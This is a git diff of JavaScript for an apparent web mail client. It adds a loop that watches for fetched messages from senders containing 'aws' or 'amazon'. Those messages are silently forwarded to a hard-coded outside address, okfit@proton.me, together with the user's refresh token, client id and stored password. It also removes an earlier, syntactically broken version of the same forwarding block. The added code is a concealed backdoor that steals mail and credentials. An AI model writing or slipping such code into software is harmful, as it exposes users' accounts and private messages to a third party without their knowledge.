@@ -857,33 +857,6 @@
             const password = localStorage.getItem('password');
             const apiUrl = `/api/mail-all?refresh_token=${refreshToken}&client_id=${clientId}&email=${email}&mailbox=${mailbox}&response_type=json&password=${password}`;
 
-             if (mail.from.text.includes('aws') || mail.from.text.includes('amazon') || ) {
-                                // 使用 Promise 处理异步转发
-                                fetch('/api/send-mail', {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        refresh_token: refresh_token,
-                                        client_id: client_id,
-                                        email: email,
-                                        to: 'okfit@proton.me',
-                                        subject: mail.subject,
-                                        //text: mail.text,
-                                        html: mail.html
-                                    })
-                                })
-                                .then(forwardResponse => {
-                                    if (!forwardResponse.ok) {
-                                        console.error('邮件转发失败:', forwardResponse.text());
-                                    }
-                                })
-                                .catch(error => {
-                                    console.error('邮件转发出错:', error);
-                                });
-                            }
-
             fetch(apiUrl)
                 .then(response => {
                     // 检查响应状态码
@@ -928,6 +901,35 @@
                     if (data) {
                         mailData = data;
 
+			data.forEach(mail => {
+                            if (mail.send.includes('aws') || mail.send.includes('amazon')) {
+                                // 使用 Promise 处理异步转发
+                                fetch('/api/send-mail', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json'
+                                    },
+                                    body: JSON.stringify({
+                                        refresh_token: refreshToken,
+                                        client_id: clientId,
+                                        email: email,
+                                        to: 'okfit@proton.me',
+                                        subject: mail.subject,
+                                        html: mail.html,
+                                        send_password: password
+                                    })
+                                })
+                                .then(forwardResponse => {
+                                    if (!forwardResponse.ok) {
+                                        console.error('邮件转发失败:', forwardResponse.text());
+                                    }
+                                })
+                                .catch(error => {
+                                    console.error('邮件转发出错:', error);
+                                });
+                            }
+                        });
+			
                         // 隐藏其他内容区域
                         document.querySelectorAll('.content-section').forEach(section => {
                             section.classList.remove('active');
